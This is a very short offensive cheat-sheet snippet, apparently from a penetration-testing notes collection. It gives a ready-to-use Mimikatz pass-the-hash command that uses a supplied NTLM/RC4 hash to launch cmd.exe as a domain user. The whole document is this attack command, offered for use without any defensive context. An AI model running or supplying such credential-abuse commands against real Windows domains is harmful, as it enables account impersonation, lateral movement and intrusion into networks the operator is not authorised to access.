# Mimikatz - passwd extraction

## Mimikatz PTH - cmd as a domain user
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:<DOMAIN> /run:cmd.exe" exit
`
